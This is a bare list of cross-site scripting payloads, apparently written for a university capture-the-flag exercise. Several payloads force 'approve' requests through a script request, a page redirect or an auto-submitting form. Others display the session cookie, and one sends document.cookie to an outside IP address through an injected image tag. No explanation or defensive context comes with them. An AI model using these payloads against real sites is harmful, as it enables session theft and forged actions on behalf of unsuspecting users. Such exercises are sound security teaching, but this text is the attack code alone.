<script>
    let request = new XMLHttpRequest();
    request.open("post", "http://ctf-fsi.fe.up.pt:5005/request/3701305c0e668e69206bafa3e31c6c7823753ec9/approve", true);
    request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    request.send();
</script>

<script>

</script>

<script>
    alert(document.cookie);
</script>

<script>
    document.querySelector('#flag').textContent = document.cookie;
</script>

<script>
document.write("<img src=http://10.227.149.216:5555?c=" + escape(document.cookie) + ">");
</script>

<script>
    document.querySelector('p a').href = "/request/24799e65366ee9f2a4a7331604ec916ca78a3eda/approve";
</script>

<script>
    window.location.href="http://ctf-fsi.fe.up.pt:5005/request/37fa1522dd02c7bdcf1297b0dfcc744814e087d7/approve";
</script>


<script>
    let form = document.createElement('form');
    form.action="http://ctf-fsi.fe.up.pt:5005/request/68a99c4e1ffad5f3fdf1dd0a61d8e6e1a669db9f/approve";
    form.method = "post";
    form.id = "exploit";
    document.body.appendChild(form);
    document.querySelector('#exploit').submit();
</script>